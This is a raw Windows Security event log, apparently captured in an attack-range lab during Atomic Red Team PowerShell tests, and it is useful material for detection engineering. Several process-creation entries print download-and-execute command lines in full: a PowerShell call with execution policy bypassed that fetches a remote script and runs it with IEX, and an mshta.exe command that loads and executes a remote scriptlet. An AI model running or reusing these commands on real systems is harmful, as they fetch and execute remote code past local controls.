Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382225
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x12ec
	Process Name:	C:\Windows\System32\cmd.exe
	Exit Status:	0x0
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382224
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x2100
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382223
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		8448
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55127
	Destination Address:	185.199.110.133
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382222
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		8448
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55127
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382221
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2100
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x12ec
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	powershell.exe  -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382220
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x12ec
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382219
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x22b0
	Process Name:	C:\Windows\System32\cmd.exe
	Exit Status:	0x1
03/01/2021 10:53:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382218
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x229c
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x1
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382236
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4224
	Application Name:	\device\harddiskvolume1\windows\system32\mshta.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55129
	Destination Address:	185.199.110.133
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382235
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		4224
	Application Name:	\device\harddiskvolume1\windows\system32\mshta.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55129
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382234
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1080
	New Process Name:	C:\Windows\System32\mshta.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xa98
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	mshta.exe  javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close() 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382233
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xa98
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xcc4
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\system32\cmd.exe  /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382232
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xcc4
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
